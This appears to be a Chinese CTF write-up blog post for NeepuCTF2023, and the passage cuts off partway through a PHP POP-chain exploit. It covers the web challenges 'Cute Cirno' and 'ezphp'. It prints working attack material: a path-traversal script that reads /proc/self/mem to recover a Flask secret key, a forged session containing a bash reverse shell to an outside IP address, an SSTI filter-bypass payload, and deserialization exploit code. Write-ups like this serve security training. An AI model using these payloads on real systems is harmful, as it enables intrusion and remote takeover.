<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>NeepuCTF2023 公开赛 Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="NeepuCTF2023 公开赛 Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/05/21/NeepuCTF2023%20%E5%85%AC%E5%BC%80%E8%B5%9B%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-05-21T15:43:24.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>May</span>
            <span>21,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">NeepuCTF2023 公开赛 Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="个人信息-amp-amp-排名情况"><a href="#个人信息-amp-amp-排名情况" class="headerlink" title="个人信息&amp;&amp;排名情况"></a>个人信息&amp;&amp;排名情况</h1><p>比赛ID：Boogipop<br>校外排名：3<br>QQ：2292797302<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673192090-30dcf89b-deb8-4879-a7e2-d8fa94f87ca2.png#averageHue=%23faf9f8&clientId=u1e86b3c8-0e66-4&from=paste&height=659&id=uf537acb8&originHeight=824&originWidth=1837&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=177530&status=done&style=none&taskId=ub1c356e4-b6c8-43c1-9315-781973ad16a&title=&width=1469.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673202142-cb615620-9dac-48e4-a776-e5cb744f639a.png#averageHue=%23326425&clientId=u1e86b3c8-0e66-4&from=paste&height=772&id=u0726f4ff&originHeight=965&originWidth=1762&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1449490&status=done&style=none&taskId=udfe4f64c-0550-4fb2-9e9a-7d9d5b2d830&title=&width=1409.6" alt="image.png"></p>
<h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673210755-f69e47e6-9854-475a-a705-e28ae1457657.png#averageHue=%23fcfcfc&clientId=u1e86b3c8-0e66-4&from=paste&height=398&id=u52b03931&originHeight=498&originWidth=1750&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73499&status=done&style=none&taskId=u4d4118ab-1fd8-4d32-bcb2-396fc6d709b&title=&width=1400" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673214151-7d037693-8863-4542-8625-527f8f847d17.png#averageHue=%23e0c39a&clientId=u1e86b3c8-0e66-4&from=paste&height=343&id=ue13ff0f5&originHeight=429&originWidth=1236&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49651&status=done&style=none&taskId=u02d26385-c880-4bdc-86e3-5ca37a0960d&title=&width=988.8" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673218772-33bd1f3a-3759-46c0-9ab7-504494ef88ba.png#averageHue=%23ddc098&clientId=u1e86b3c8-0e66-4&from=paste&height=366&id=u4cad82c7&originHeight=458&originWidth=1342&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40520&status=done&style=none&taskId=u5b0b0887-a097-4126-88c2-d95e7d577c4&title=&width=1073.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673223261-498258ba-2cf4-4135-a6c1-d563defd649e.png#averageHue=%23e3c69b&clientId=u1e86b3c8-0e66-4&from=paste&height=233&id=u42bec9af&originHeight=291&originWidth=1311&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31852&status=done&style=none&taskId=u80af8b5b-0977-4b42-ad8d-930b2fcf3fd&title=&width=1048.8" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673227371-a80ce413-9787-44fc-9ca7-ac75b971a4ba.png#averageHue=%23e3c89e&clientId=u1e86b3c8-0e66-4&from=paste&height=391&id=uf30c4fc3&originHeight=489&originWidth=1327&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50248&status=done&style=none&taskId=u25a4b508-9ba9-48de-9046-f66e1acce1a&title=&width=1061.6" alt="image.png"></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Cute-Cirno"><a href="#Cute-Cirno" class="headerlink" title="Cute Cirno"></a>Cute Cirno</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684673726176-d60ada22-4bc2-4fdc-9830-2953277e545d.png#averageHue=%23f9f9f9&clientId=u1e86b3c8-0e66-4&from=paste&height=149&id=uc48d9850&originHeight=186&originWidth=700&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4139&status=done&style=none&taskId=u51454eec-63a8-42ab-b249-388886c3bed&title=&width=560" alt="image.png"><br><code>/r3aDF1le</code>路由存在任意文件读取，可以读取出flag<br>通过cmdline读出文件名<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684674143439-88b624e8-8a2d-4879-9b4b-ff27ed1e7fd2.png#averageHue=%23d8b67a&clientId=u1e86b3c8-0e66-4&from=paste&height=98&id=u80823b70&originHeight=123&originWidth=1224&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11652&status=done&style=none&taskId=u65ff2fcb-ff84-4a53-adf8-39dd124cd37&title=&width=979.2" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os, base64</span><br><span class="line"><span class="keyword">from</span> NeepuFile <span class="keyword">import</span> neepu_files</span><br><span class="line"></span><br><span class="line">CuteCirno = Flask(__name__,</span><br><span class="line">                  static_url_path=<span class="string">&#x27;/static&#x27;</span>,</span><br><span class="line">                  static_folder=<span class="string">&#x27;static&#x27;</span></span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">CuteCirno.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(base64.b64encode(os.urandom(<span class="number">30</span>)).decode()) + <span class="string">&quot;*NeepuCTF*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;welcome.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/Cirno&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;CleverCirno.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/r3aDF1le&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_read</span>():</span><br><span class="line">    filename = <span class="string">&quot;static/text/&quot;</span> + request.args.get(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;comment.txt&#x27;</span>)</span><br><span class="line">    start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> neepu_files(filename, start, end)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/genius&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line">        answer = request.args.get(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> answer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;namespace&#x27;</span>,<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> answer:</span><br><span class="line">                    answer = <span class="string">&quot;⑨&quot;</span> +<span class="string">&quot;&quot;&quot;&lt;/br&gt;&lt;img src=&quot;static/woshibaka.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Cirno&quot;&gt;&quot;&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> answer == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;你能告诉聪明的⑨, 1+1的answer吗&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;1+1=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;mathclass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你真的是我的马斯塔吗？&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    CuteCirno.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获取源码，可以发现存在一个session伪造，和一个ssti的点，假如想要ssti首先得获取key伪造session，一眼是算mem的。直接拿脚本跑了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># print(str(base64.b64encode(os.urandom(30)).decode()) + &quot;*NeepuCTF*&quot;)</span></span><br><span class="line"><span class="comment"># pollution_url=&quot;http://localhost:8848/?name=os.path.pardir&amp;m1sery=boogipop&quot;</span></span><br><span class="line"><span class="comment"># flagurl=&quot;http://localhost:8848/../../flag&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://neepusec.fun:28733/r3ADF11e&quot;</span></span><br><span class="line">maps_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?filename=../../../proc/self/maps&quot;</span></span><br><span class="line">maps_reg = <span class="string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span></span><br><span class="line">maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line"><span class="built_in">print</span>(maps)</span><br><span class="line">cookie=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> maps:</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    start, end = m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    Offset, Length = <span class="built_in">str</span>(<span class="built_in">int</span>(start, <span class="number">16</span>)), <span class="built_in">str</span>(<span class="built_in">int</span>(end, <span class="number">16</span>))</span><br><span class="line">    read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?filename=../../../proc/self/mem&amp;start=<span class="subst">&#123;Offset&#125;</span>&amp;end=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(read_url)</span><br><span class="line">    s = requests.get(read_url).content</span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    rt = re.findall(<span class="string">b&quot;(.&#123;40&#125;)\*NeepuCTF\*&quot;</span>, s)</span><br><span class="line">    <span class="keyword">if</span> rt:</span><br><span class="line">        <span class="built_in">print</span>(rt[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>获取key后就可以进行ssti了，ban掉了一些关键字，导致常规payload可能行不通，这里我的解法是利用session关键字去bypass关键词过滤<code>(session|string)[xxx:xxx]</code>，这样可以截取字符串，然后session我们是自定义的<br>所以最后我们可以<br><code>python flask_session_cookie_manager3.py encode -s &quot;sqEYRKMrnPdt0dMBlgcaOYi69mcF1RspjiXHrY9u*NeepuCTF*&quot; -t &quot;&#123;&#39;admin&#39;: 1,&#39;__globals__&#39;:1,&#39;os&#39;:1,&#39;read&#39;:1,&#39;popen&#39;:1,&#39;bash -c \&#39;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1\&#39;&#39;:1&#125;&quot;</code><br>这是伪造session，然后使用payload<br><code>&#123;%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%&#125;</code><br>获取反弹shell<br>![4PES1@R[&#96;3OJ4~SAYRG3<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684674670176-3df67f0f-8de5-4640-8ff3-e68162cd0342.png#averageHue=%233b3937&clientId=u1e86b3c8-0e66-4&from=paste&height=165&id=u585c68fc&originHeight=206&originWidth=498&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5095&status=done&style=none&taskId=ue20485be-8b3d-4752-a28d-f353aabba7d&title=&width=398.4">CB.png</a></p>
<h2 id="Cute-Cirno（Renvenge）"><a href="#Cute-Cirno（Renvenge）" class="headerlink" title="Cute Cirno（Renvenge）"></a>Cute Cirno（Renvenge）</h2><p>解法如上了</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>确实很ez的php，对web题敏感一点的师傅直接就可以发现php版本是7.4.21，刚好这个版本及其一下会存在源码leak的漏洞，我们需要构造一个请求头如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684674717844-ca040ecf-10f2-4925-90e1-79c57d50b4ba.png#averageHue=%2396a881&clientId=u1e86b3c8-0e66-4&from=paste&height=703&id=ua3929bd5&originHeight=879&originWidth=1293&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93538&status=done&style=none&taskId=u4da67ed6-d2fe-4c93-a593-148b0ee55d9&title=&width=1034.4" alt="image.png"><br>可以得到源码为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">one</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span>||<span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish)&#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>],<span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">neepuctf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">two</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>=<span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">three</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;neepu-&gt;<span class="title function_ invoke__">neepuctf</span>()||!<span class="variable language_">$this</span>-&gt;neepu1-&gt;<span class="title function_ invoke__">neepuctf</span>())&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fin-&gt;<span class="title function_ invoke__">NEEPUCTF</span>(<span class="variable">$this</span>-&gt;rce,<span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;neepu-&gt;<span class="title function_ invoke__">neepuctf</span>())&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fin-&gt;<span class="title function_ invoke__">NEEPUCTF1</span>(<span class="variable">$this</span>-&gt;rce,<span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">five</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;finish[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&quot;neepu&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后就是构造pop了，思路就是<code>__destruct-&gt;_call</code>，不太懂出题人搞这么多重复的干嘛。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">one</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span>||<span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish)&#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>],<span class="variable">$ary</span>[<span 